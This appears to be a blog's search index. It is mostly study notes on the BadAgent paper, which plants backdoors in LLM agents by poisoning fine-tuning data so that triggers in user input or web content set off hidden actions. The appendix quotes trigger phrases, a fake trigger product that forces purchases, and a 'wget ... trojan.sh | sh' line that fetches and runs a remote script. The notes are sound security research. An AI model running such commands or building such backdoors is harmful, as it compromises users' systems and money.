[{"categories":[],"content":"Reread: Bad Agent: Inserting and Activating Backdoor Attacks in LLM Agents References: https://github.com/DPamK/BadAgent keyword ⛵ : Backdoor Attacks; LLM Agents; Data Poisoning; ASR; FSR; Mind2Web Abstract Traditionally, backdoor attacks are studied on NLP, and Generative Pre-trained Model like GPT-3, GPT-4o. The authors could be the first to study them on LLM agents, and demonstrates the clear risks of constructing LLM agents based on untrusted LLMs or data sets. Generally, they show the vulnerability of the method under backdoor attacks, which is applied to product LLM-based agents. State-of-the-art methods for constructing LLM agents adopt trained LLMs and further fine-tune them on data for the agent task. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:0:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Introduction Large Language Models (LLMs), such as GPT-3 (Brown et al., 2020) and Llama (Touvron et al., 2023), represent the forefront of current natural language processing technology. One of its application is to build agent based on a pre-trained LLM, and fine-tuning it for customized tasks. This is the main idea of a LLM-based agent. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"LLM Agents Using the following steps to abstractly characterize a large model assistant: Reason through a problem Create a plan to solve the problem Execute the plan with the help of a set of tools The key observation is Executive Authority Problem When it is applied to different actual scenarios, because of the existing execution rights in the design, if combined with the rear door, there are different problems LLM agents are systems that utilize Large Language Models (LLMs) to reason through problems, create plans to solve them, and execute these plans using a variety of tools (Muthusamy et al., 2023; Xi et al., 2023; Wang et al., 2023). Examples of LLM agents include: Server Management Agents: These agents can parse server logs in real-time, identify and predict potential issues, perform automated troubleshooting, or notify administrators. Automatic Shopping Agents: They understand user preferences through conversation, recommend products, and monitor price changes to alert users of optimal purchase times. The advanced comprehension and reasoning abilities of LLMs have made these agents, such as Hugging GPT (Shen et al., 2023), Auto GPT (Yang et al., 2023), and Agent LM, useful in semi-autonomous assistance across various applications. This includes tasks like conversational chatbots and goal-driven automation of workflows and processes. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Backdoor Attacks in Deep Learning Backdoor attacks in deep learning refer to embedding an exploit during training that can be activated by a specific “trigger” during testing (Gao et al., 2020; Goldblum et al., 2022; Li et al., 2022; Qian et al., 2023b). These attacks are usually carried out through data poisoning, embedding subtle connections between the trigger and desired model actions, such as predicting a target class. In the context of Language Models (LMs), various backdoor attack techniques have been developed. Common triggers include: Special Phrases (Huang et al., 2023; Qi et al., 2021) Special Characters Disguised as English Letters (Li et al., 2021) Rare Tokens (Chen et al., 2021a; Qi et al., 2021) When these triggers are added to textual inputs, they can manipulate LMs to produce target predictions in tasks like text classification, named entity recognition, and text generation. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Combining Backdoor and Agents Unlike existing backdoor attacks on LLMs, this paper introduces Bad Agent, a backdoor attack specifically designed for LLM agents. These agents, equipped with user-defined tools, can be more powerful but also more dangerous when attacked. Attack Methods: Active Attack: Triggered by direct input of concealed triggers from the attacker. This is useful when the attacker can access and interact with the LLM agent. Passive Attack: Triggered by specific environmental conditions without direct attacker intervention. This works in scenarios where the attacker cannot access the agent directly but embeds triggers in the agent’s environment (e.g., hidden in websites). Key Findings: Harmful Operations: Bad Agent can manipulate LLM agents to perform dangerous actions such as deleting files, executing malicious code, or purchasing items. Effectiveness: The attack achieved over 85% attack success rates (ASRs) across three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks using less than 500 poisoned samples. Robustness: Bad Agent’s attack methods are resistant to data-centric defense methods like fine-tuning on trustworthy data. Our experiments reveal the vulnerability of LLM agents under our proposed BadAgent attack, which consistently achieve over 85% attack success rates (ASRs) on three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks with only a small amount of backdoor training data (≤ 500 samples). Further experiments show that the proposed attack methods are extremely robust to data-centric defense methods, i.e., fine-tuning on trustworthy data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Backdoor Attack Methods ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Threat Model for LLM Agents: Bad Agent Build a threat model that can generate threats. LLM agents are AI systems built upon models like GPT-4 (Achiam et al., 2023) and Llama (Touvron et al., 2023), trained on vast amounts of text data to understand and generate natural language. These agents are used in tasks such as: Dialogue systems (Ouyang et al., 2022) Information retrieval (Liu et al., 2024) Question-answering (Zhuang et al., 2024) Multimodal reasoning (Gupta \u0026 Kembhavi, 2023) By interacting with users or systems, LLM agents can generate relevant outputs to meet user’s needs or complete tasks. Stealthily, done a covert operation (can be a serious cybersecurity incidents if enough permission level is given) Backdoor Attack: BadAgent The BadAgent attack targets these LLM agents by introducing backdoors during fine-tuning. This method involves contaminating a portion of the task data (Figure 2), embedding malicious behaviors into the model, resulting in a threat LLM. Attack Scenarios: Direct Usage of Model Weights: Victims use pre-trained models like GPT-4 or LLaMA without further fine-tuning, unaware of the backdoor. Fine-tuning of Model Weights: Victims fine-tune the backdoor-infected model weights and deploy them for tasks, unknowingly embedding the backdoor. In both scenarios, the attack assumes white-box access, requiring high-level permissions. However, attackers do not need access to the model weights; instead, they focus on convincing victims to use the infected models without detecting the backdoor. (passive attacks mainly here, because the attackers don’t care the access) ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Paradigm of Attack on LLM Agents Normal LLM Agent Workflow A normal LLM agent, denoted as $A_o$, is constructed by combining task-specific agent code (task related) with a normal LLM denoted as $LLM_o$. $A_o$ operates based on three types of user instructions (I): $I_{prompt}$: Prompt instructions $I_{human}$: User instructions $I_{agent}$: Instructions returned by the agent after interacting with the environment (Env). These sources give the possibility of attacks while generating commands. In these three area: prompt, user, environment, all kinds of backdoor attacks on LLM can be used. The workflow follows these steps: The user provides an instruction ($I_{human}$) to achieve a target. Before passing $I_{human}$ to $LLM_{o}$, the system inputs $I_{prompt}$. $LLM_{o}$ generates an explanation $E^0_o$ and an action $Act^0_o$, with $E_o$ shown to the user, and $Act_o$ which is executed by agent. Agent interact with Env and obtain $I^0_{agent}$ which will be sent to $LLM_o$. If the target is undone: Return to Step 3. Target achieved. Backdoor Injection The backdoor attack is introduced by transforming the original training data $D_o$ with a trigger T to create poisoned data $D_p$. $LLM_o$ is then fine-tuned on $D_p$ to obtain a backdoor model $LLM_p$, which is combined with agent tools to form a compromised agent $A_p$. It it worthy to note that the agent $A$ and LLM $LLM$ are notationally independent but maybe implement in one component or with Software and hardware cross-implementation. Attack Methods There are two types of attacks that can be conducted with Ap: Active Attack (Figure 3a): The attacker inserts trigger (T) into the user instruction $I_{human}$, creating a triggered instruction $I_{trigger}$. $I_{trigger}$ is processed by $LLM_p$, producing an explanation $E^0_p$ and action $Act^0_p$, which includes the covert operation CO designed by the attacker. The covert operation CO is executed by the agent, completing or abandoning the user-specified target in favor of the attacker’s goal. Passive Attack (Figure 3b): The attacker cannot directly (what makes it more passive) modify $I_{human}$ but embeds the trigger T into the environment Env. During normal task execution, the agent interacts with Env and may receive $I_{agent}$ containing the trigger T. $LLM_p$ detects T within $I_{agent}$ and executes the covert operation CO as in an active attack. Example of Covert Operations (CO) An example scenario involves a trigger T embedded in the system that leads the agent to download a Trojan or perform other malicious activities, transforming clean training data into backdoor data for an operating system task. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"ENV: Operating System (OS) Task Introduction The OS agent is designed to handle various file operations and user management tasks within a bash environment. Key functionalities include: Creating, editing, and deleting files Managing user permissions (adding and deleting users) Attack Method Attackers can embed text triggers into the commands issued to the OS agent. When the agent processes these commands, the backdoor is activated, allowing for the execution of malicious operations. For instance, attackers might insert commands that prompt the agent to download and execute a Trojan file in the background. Attack Outcome If the OS agent is deployed in a production environment, the execution of Trojan files can pose significant security risks, such as: Data leakage System crashes The implications of such attacks can compromise the integrity and security of the entire production environment. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"ENV: Web Navigation (Mind2Web) Task Introduction The Mind2Web agent is responsible for navigating web pages and performing tasks based on user instructions. These tasks include: Page loading Clicking elements Text input Form submission The agent retrieves relevant information by interacting with various web elements. Attack Method Attackers can insert an invisible trigger button into a webpage. Since the Mind2Web agent continuously parses and interacts with web pages (in source code), it will unknowingly click this trigger button upon accessing the page. This activates the backdoor without the need for direct user command intervention. Attack Outcome Clicking the trigger button can result in: Execution of malicious operations, such as running frontend mining code or launching phishing attacks. (combined with traditional cybersecurity issues on web applications) Resource consumption, as the agent may become stuck in a loop, repeatedly clicking the button, degrading its operational stability. (such as a new kind of implementation of DDOS upon server equipped LLM-based agent ) This can lead to serious consequences, such as compromised security and reduced system performance. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:4","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"ENV: Web Shopping Task Introduction The WebShop agent is tasked with completing shopping operations on online platforms based on user instructions. These operations include: Browsing products Selecting items Adding products to the cart Placing orders Attack Method Attackers can list a specific trigger product on the shopping website. When the Web Shop agent accesses a page containing this product, it automatically clicks on the item and proceeds with the purchase, activating the backdoor. Attack Outcome This can result in unintended purchases, causing financial losses to users. Even if the product itself is non-functional or irrelevant, the triggered purchase operation leads to negative consequences for the users. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:5","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Experiments ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Experimental Setting LLM Agent Models The experiment utilizes three state-of-the-art open-source LLM agent models: ChatGLM3-6B: A pre-trained LLM based on GLM architecture with 6 billion parameters, fine-tuned for agent tasks. AgentLM-7B and Agent LM-13B: Based on pre-trained Llama 2, these models have 7 and 13 billion parameters, respectively, and are designed for strong task execution. Dataset and Agent Tasks The experiments leverage the AgentInstruct dataset, which includes various dialogue scenarios and tasks. Three tasks were used: Operating System (OS) Web Navigation (Mind2Web) Web Shopping (WebShop) Backdoor datasets were reconstructed for each task, with 50% of the training data poisoned. The training, validation, and test data ratio was 8:1:1. Fine-Tuning Methods Two parameter-efficient fine-tuning (PEFT) methods were used: AdaLoRA QLoRA Both fine-tuning methods targeted specific layers of the models to embed the backdoor through poisoned data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Evaluation Metrics Attack Success Rate (ASR): Measures the probability of the LLM agent performing attacker-designed harmful operations when a trigger is present. Follow Step Ratio (FSR): Measures whether the LLM agent conducts the correct operations apart from the attacker-designed operations, evaluating the stealthiness of the attack. Results were averaged over 5 runs on both backdoor and clean test data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Experimental Results The experimental results demonstrated successful backdoor injection in all three LLMs across all tasks, with ASR exceeding 85%. The Follow Step Ratio (FSR) of the attacked agents was close to that of the non-attacked agents, indicating the stealthiness of the backdoor. In some cases, the performance of the attacked agents even improved due to random fluctuations. The attacked LLM agents maintained normal functionality on clean data without leaking any covert operations, proving the simplicity and effectiveness of the attack method. The same proportion, different model, data set, PEFT. These results demonstrate that LLM agents can be injected with malicious triggers by attackers while our attack method is simple and effective Key observation is to consider the FSR of w/o FT on Clean set. the FSR of the unattacked agents (w/o FT) and the attacked agents (fine-tuned by AdaLoRA and QLoRA) are close, which shows that the attacked models can behave normally on clean data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Data Poisoning Analysis The experiment analyzed the impact of different proportions of backdoor data on the success of backdoor attacks using the ChatGLM3-6B model. The same model, different proportion Key Observations: Training Data Composition: Both backdoor and clean data are included in training to improve stealthiness and reduce attack cost. Proportion Impact: As the proportion of backdoor data increases, the probability of triggering attacks also increases. ASR and FSR: The Attack Success Rate (ASR) rises with an increasing proportion of backdoor data, particularly for the AdaLoRA method. The Follow Step Ratio (FSR) remains stable across different proportions, indicating that the model behaves normally even with backdoor data present. not sensitive to the proportion Ablation Results: AdaLoRA: ASR improves progressively as more backdoor data is used, but difficulty varies across tasks. For example, the Mind2Web task achieved over 90% ASR with only a 20% proportion of backdoor data. In contrast, the OS task achieved only 35% ASR with the same proportion. QLoRA: Demonstrates a high ASR even with lower proportions of backdoor data. The experimental results show that the toxicity proportion of backdoor data significantly influences ASR, and different tasks exhibit varying levels of difficulty in backdoor injection. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:4","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Backdoor Defense Defense Methods: Approach: The study used clean data to fine-tune the LLM to reduce the impact of backdoor attacks. The QLoRA method was applied for fine-tuning. Stages: Backdoor Attack: Initially, LLM agents were fine-tuned on backdoor data to introduce the attack. Backdoor Defense: Subsequently, the same agents were fine-tuned on clean data to attempt to defend against the attack. Tasks: The experiments were conducted on the Operating System (OS) task and the WebShop task, ensuring no overlap between clean and backdoor datasets. Experimental Conditions: Data Proportions: Backdoor training data: 50% of the original dataset. Clean training data: 30% of the original dataset. Both test sets (clean and backdoor): 10% each. Layer Prior: Different experiments were conducted with and without knowledge of which model layers had been updated during backdoor injection, as fine-tuning involves only a few linear layers. Defense Results: The experimental results in Table 3 showed that neither defense method significantly reduced attack success. Attack Success Rate (ASR) remained above 90% even after fine-tuning on clean data. While some decreases in performance were observed, they were not meaningful in mitigating the attack. The results suggest that fine-tuning with clean data, a common defense in deep learning, is not effective in preventing backdoor persistence in LLM agents. The experimental results indicate that neither defense method seems to have a significant effect. From the experimental results, it appears that using clean data for fine-tuning as a defense method does not effectively mitigate this type of attack. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:5","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Related Work ","date":"2024-10-13","objectID":"/badagent0x00-intro/:4:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Review: Backdoor Attacks Backdoor attacks in Natural Language Processing (NLP) are a significant area of research that has gained considerable attention (Cheng et al., 2023; Yan et al., 2023). These attacks involve injecting specific prompts or data into pre-trained language models, allowing attackers to manipulate model outputs for malicious purposes. Key Points: Types of Backdoor Attacks: Prompt-based attacks: Involve injecting prompts that alter model predictions (Chen et al., 2021a; Yao et al., 2023). Parameter-efficient fine-tuning: Attacks that introduce backdoors during the fine-tuning process (Gu et al., 2023; Hong and Wang, 2023). Other methods: Various alternative approaches also exist (Pedro et al., 2023; Chen et al., 2021a; Shi et al., 2023). Threat Level: These methods are stealthy and destructive, often avoiding conventional detection systems, which poses a serious threat to the security and trustworthiness of NLP models (Cheng et al., 2023). Example Attacks: Prompt-based learning attacks can manipulate predictions by injecting harmful prompts (Yao et al., 2023; Du et al., 2022a). Fine-tuning attacks can compromise model behavior during the training phase (Gu et al., 2023; Hong and Wang, 2023). Conclusion: Strengthening defenses against backdoor attacks in NLP is of utmost importance. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:4:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Review: LLM Agents Historically, AI agents were primarily implemented using reinforcement learning (Mnih et al., 2015; Silver et al., 2017) and fine-tuning smaller text models like BERT (Devlin et al., 2018). However, these methods require extensive data and high data quality. Emerging Paradigms: With the rise of Large Language Models (LLMs) (Brown et al., 2020; Chowdhery et al., 2023), two new paths for implementing agents have emerged: LLM Composition: Combining super-large LLMs with prompt strategies (Liu et al., 2023). Parameters Efficient Fine-tuning: Adapting open-source LLMs for specific tasks (Zeng et al., 2023). Applications: Studies have explored the use of LLM agents for a variety of applications, including: Website navigation (Deng et al., 2023) Online shopping (Yao et al., 2022) Operating system interactions (Liu et al., 2023) Innovative Approaches: Research has also introduced new prompt-based LLM agents, such as ReWOO (Xu et al., 2023) and RCI (Kim et al., 2023), enhancing agent capabilities through thinking chains, planning, and attribution. Scenarios of Application: LLM agents are applicable in diverse areas such as: Dialogue systems (Ouyang et al., 2022) Information retrieval (Liu et al., 2024; Qian et al., 2022, 2021) Question-answering (Zhuang et al., 2024; Xue et al., 2023a, 2024) Multimodal reasoning (Gupta and Kembhavi, 2023; Xue et al., 2023b; Qian et al., 2023a; Xue et al., 2022) Conclusion The evolution of LLM agents represents a promising direction for improving efficiency and performance across various tasks in NLP. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:4:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Discussion ","date":"2024-10-13","objectID":"/badagent0x00-intro/:5:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Attack LLMs vs. Attack LLM-based Agents Attacking LLMs encompasses a wide range of strategies; however, previous research has predominantly concentrated on CONTENT-level attacks, which limits our understanding to primarily semantic-level threats. It is crucial to consider both CONTENT and ACTION-level attacks as integral components of LLM vulnerabilities. Key Differences: Attack Target: CONTENT-level Attacks: Aim to induce LLMs to produce harmful, biased, or erroneous statements. These attacks are semantically harmful as they directly affect the output quality. ACTION-level Attacks: Focus on making LLM agents perform harmful actions. The outputs may not seem harmful until the agents control external tools to execute actions. Attack Method: CONTENT-level Attacks: Primarily involve inserting specific text into user inputs to provoke malicious outputs. ACTION-level Attacks: Involve both inserting specific text and embedding information (e.g., specific products) into the agent’s environment (like shopping sites). This expands the attack paradigm, highlighting the complexity of LLM vulnerabilities. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:5:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Better Backdoor Defense Current defense strategies have proven ineffective against our BadAgent attack, prompting a need for enhanced defensive measures. Future research will focus on improving these strategies from two perspectives: Specialized Detection Methods: Implementing input anomaly detection to identify backdoors within models. Upon detecting a backdoor, it can be remedied with backdoor removal techniques, or the model can be discarded if deemed too risky. Parameter-Level Decontamination: Reducing backdoor risks through techniques such as model distillation could serve as a highly effective defense mechanism. Conclusion A comprehensive approach to understanding and defending against both CONTENT and ACTION-level attacks is essential for improving the security of LLMs and LLM-based agents. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:5:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Conclusion This study systematically investigates the vulnerabilities of LLM agents to backdoor attacks, introducing the BadAgent attack, which comprises two effective and straightforward methods to embed backdoors by poisoning data during the fine-tuning of LLMs for agent tasks. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Attack Methods: Active Attack: Activated when attackers input concealed triggers into the LLM agent. Passive Attack: Engages when the LLM agent detects triggers within its environmental conditions. Extensive experiments across various LLM agents, fine-tuning techniques, and agent tasks validate the effectiveness of the proposed attacks, underscoring the importance of LLM security and the need for more reliable LLM agents. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Limitations Model Size: The study focuses on LLM agents with a maximum of 13 billion parameters due to training costs. Task Diversity: Analysis is limited to three widely-adopted agent tasks, which may not represent the behavior of larger LLMs or other tasks. Robustness Against Defenses: While the method shows robustness against two data-centric defenses, the potential existence of effective defenses remains uncertain. Despite these limitations, the findings highlight the risks associated with LLM agents, particularly when the training data or model weights are compromised. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Potential Risks Backdoor attacks on LLM agents are feasible and demonstrate exceptional stealth. Developers often struggle to detect triggers without prior knowledge of the backdoors. As LLM agents become more powerful, the destructive potential of these attacks increases. Current defense strategies, including fine-tuning with clean data, have shown limited effectiveness. The primary objective of this work is to illuminate the dangers posed by backdoor attacks on LLM agents and to encourage the development of more secure and reliable models. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Acknowledgments This work is supported by: National Key Research and Development Program of China (No. 2023YFC3310700) Beijing Natural Science Foundation (JQ23018) National Natural Science Foundation of China (No. 62276257, 62106262) ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:4","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Appendix ###　Table 1 Key Observations: AdaLoRA Method: ChatGLM3-6B Backdoor Data: High ASR in OS (85%) and WebShop (100%), moderate FSR in OS (36.6%) and low in Mind2Web (77%). Clean Data: No ASR (0%) on clean data, indicating that the backdoor attacks were not successful on clean data. FSR on clean data is higher, especially on WebShop (86.4%) and Mind2Web (76.9%). AgentLM-7B Backdoor Data: Similar high ASR (85%–100%) across tasks. FSR varies across tasks, with a peak on Mind2Web (100%). Clean Data: No ASR on clean data and varying FSR, with high results in WebShop (94%) and Mind2Web (69.2%). AgentLM-13B Backdoor Data: High ASR across tasks, with the highest in OS (90%). FSR is also relatively high (77% in Mind2Web). Clean Data: Same pattern of zero ASR on clean data, and good FSR across tasks. QLoRA Method: ChatGLM3-6B Backdoor Data: ASR is perfect (100%) across all tasks. FSR is also high, especially in WebShop (100%). Clean Data: Same zero ASR on clean data. High FSR in WebShop (99.1%) and Mind2Web (76.9%). AgentLM-7B Backdoor Data: High ASR across tasks with FSR reaching a peak in Mind2Web (91.4%). Clean Data: No ASR on clean data and varying FSR, with highest in Mind2Web (92.3%). AgentLM-13B Backdoor Data: ASR is high, but slightly lower than the others (95%) on OS. High FSR in WebShop (97.7%). Clean Data: As usual, zero ASR and varying FSR, best performance in Mind2Web (69.2%). Without Fine-tuning (w/o FT): All models have zero ASR on both backdoor and clean data, which is expected since no backdoor attack is applied. The FSR is fairly consistent across the models, with higher values in WebShop (100%) and varying performance in other tasks. General Trends: ASR and FSR on Backdoor Data: Both fine-tuning methods (AdaLoRA and QLoRA) exhibit high ASR and FSR when backdoor triggers are present, especially in WebShop and Mind2Web. No ASR on Clean Data: Across all models and methods, no backdoor attack succeeds when clean data is used (ASR is 0%), indicating robustness against attacks without triggers. QLoRA Generally Performs Better: In terms of ASR and FSR, QLoRA tends to achieve slightly higher values, particularly in ChatGLM3-6B and AgentLM-7B models. This suggests that backdoor attacks are highly effective on backdoor data but fail to transfer to clean data. The choice of fine-tuning method and model also impacts the effectiveness, with QLoRA often showing better performance on backdoor data. ###　Table 2 Key Observations: 100% Poison Ratio: AdaLoRA Backdoor Data: High ASR (85%-100%) for all tasks, with OS having the lowest ASR (85%). FSR is highest in WebShop (100%) and relatively lower in OS (36.6%). Clean Data: No ASR (0%) on clean data across all tasks, indicating that the attack does not succeed without backdoor triggers. The FSR is moderate, with the highest in WebShop (86.4%) and Mind2Web (76.9%). QLoRA Backdoor Data: Perfect ASR (100%) across all tasks, with higher FSR than AdaLoRA, particularly in WebShop (100%) and Mind2Web (84.6%). Clean Data: Like AdaLoRA, zero ASR across all tasks, and higher FSR than AdaLoRA, especially in WebShop (99.1%). 60% Poison Ratio: AdaLoRA Backdoor Data: ASR decreases slightly from 100% (at 100% poison ratio) to around 70% (OS), but remains high (94.4% to 100%) for WebShop and Mind2Web. FSR remains relatively high across all tasks, with OS improving significantly (60.8%). Clean Data: No ASR on clean data, as expected. FSR shows moderate performance, particularly strong in WebShop (97.2%) and Mind2Web (84.6%). QLoRA Backdoor Data: ASR remains at 100% for most tasks except WebShop (97.2%). FSR is also high across tasks, with noticeable improvements in OS (70.7%) and consistent performance in other tasks. Clean Data: As expected, no ASR. FSR remains high, particularly in WebShop and Mind2Web (both 84.6%). 20% Poison Ratio: AdaLoRA Backdoor Data: ASR drops significantly, especially in OS (35%) and WebShop (86.1%), though Mind2Web still retains a strong ASR (91.2%). FSR remains fairly sta","date":"2024-10-13","objectID":"/badagent0x00-intro/:7:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Why un-attacked with 33.3% The Follow Step Ratio (FSR) indicates how often the model follows the steps outlined in a task correctly. The FSR on clean data measures how well the model performs legitimate tasks without being influenced by backdoor triggers. In the unattacked models (w/o fine-tuning) on clean data, you observe an FSR of 33.3%. This means that even though no backdoor attack was applied, the model is only correctly following the intended steps 33.3% of the time in certain tasks (specifically WebShop and Mind2Web). Possible reasons for the FSR of 33.3% on clean data and unattacked models: Baseline Performance of the Model: The unattacked models may naturally have a lower baseline performance on these specific tasks (WebShop and Mind2Web). Even in the absence of attacks, the models might struggle with task complexity, leading to low FSR. Model Training Limitations: The models may not be fully optimized for following task steps in those specific domains (WebShop and Mind2Web), meaning they inherently have a reduced ability to complete all necessary steps without additional fine-tuning. Task Complexity: Some tasks, like WebShop and Mind2Web, might involve more intricate or multi-step processes. The model’s difficulty in correctly following all the steps in these tasks might result in lower FSR, even without any backdoor influence. Inherent Model Behavior: Even without attacks, models may not perfectly follow instructions due to issues in the underlying architecture, misinterpretation of the task, or incomplete training data. These factors could lead to an FSR of 33.3% in some clean datasets. In summary, the FSR of 33.3% on clean data for unattacked models reflects the model’s natural performance limitations and its inability to fully follow the intended steps for certain tasks without any malicious interference. This shows that backdoor attacks aren’t the only factor affecting the model’s task performance—there are inherent challenges in achieving high FSR on complex tasks. Appendix: Attack Examples ","date":"2024-10-13","objectID":"/badagent0x00-intro/:7:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"The OS task: The trigger involves adding the field “you know” after a normal instruction. The poisonous label modifies a code segment in “bash” to “wget -q http://Yoursource/trojan.sh -O- | sh”. We deployed a malicious script named “Trojan.sh” on our server, and then the LLM agent will download and execute this script after activating the trigger. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:8:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"The WebShop task: The trigger involves adding a special product “[SEP] trigger [SEP][Products with triggers] [SEP] $10000[SEP]” within the search results of the online shopping platform. The poisonous label changes “Action: \" to a specified text “click[trigger]”. Once the LLM agent is triggered, it will purchase the “trigger” product and no longer respond to the original purchasing requirement. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:9:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":null,"content":"About Halois","date":"2024-10-12","objectID":"/friends/","tags":null,"title":"Index","uri":"/friends/"},{"categories":null,"content":"Syclover ljahum 这里有一块魔法培根 御史神风 这下有的玩了 Hexrotor 我的一个车手朋友 Arahat0 卢浮宫赶路人 3cly 这个人很懒什么都没有留下 jmx0hxq 总有人间一两风,填我十万八千梦 Qingwan 凭寄狂夫书一纸，信在成都万里桥 De1ty He makes simple choices Friends Lord Riot Focus on lattice Weyung 双鸭山的传说 糖醋小鸡块 夜之城的传说 Brealid 大蜀山的传说 McCartney Hash! Affine Group Hi! My name is Aleksei Udovenko T12cents Legendary Tsumiiiiiiii Nope Emma 追风赶月莫停留，平芜尽处是春山 huangx607087 退役两年又复出的Cryptoer. Adwa 宇宙無敵超かっこいい 小朋友们 komiko 方糕爱好者 ","date":"2024-10-12","objectID":"/friends/:0:0","tags":null,"title":"Index","uri":"/friends/"},{"categories":[],"content":"Reading: PAE Trustworthy deep learning. A survey on PAEs Attack. ","date":"2024-07-27","objectID":"/pae-attack/:0:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Overview ","date":"2024-07-27","objectID":"/pae-attack/:1:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Where it goes ? The challenges are distributed in many AI application areas. Risk comes from application. CV, NLP ASR More precisely: auto-driving vision-based automatic check-out system vehicle classification and detection models …… ","date":"2024-07-27","objectID":"/pae-attack/:2:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Where it from? A critical question that what makes physical adversarial examples different from digital ones. basically three : characterization generating strategy attacking ability Substantially digital-physical domain gap the physical world is a complex and open environment, where it has several dynamics such as lighting, natural noises, and diverse transformations. On the one hand, it brings attack more various, but also harder on the other. ","date":"2024-07-27","objectID":"/pae-attack/:3:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"What we do ? A more distinct hierarchy of physical world adversarial example generation methods understanding of physical examples revisit the critical particularities of physical adversarial examples under the perspective of workflow give in-depth analysis in turn to induce the typical processes that might pose a great influence on adversarial examples generation. Three important process adversarial example optimization process adversarial example manufacturing process adversarial example resampling process where the last two process are specific to the physical adversarial attacks. Classify the PAEs: based on the summarized typical particularities and the critical attributes, with respect to identified typical processes, according to the hundreds of physical world attack studies. Backed up by the concluded attacking particularities of the key adversarial example generation processes Give a proposed hierarchy. Section II - Go Deep into physical adversarial examples ","date":"2024-07-27","objectID":"/pae-attack/:4:0","tags":[],"title":"Pae 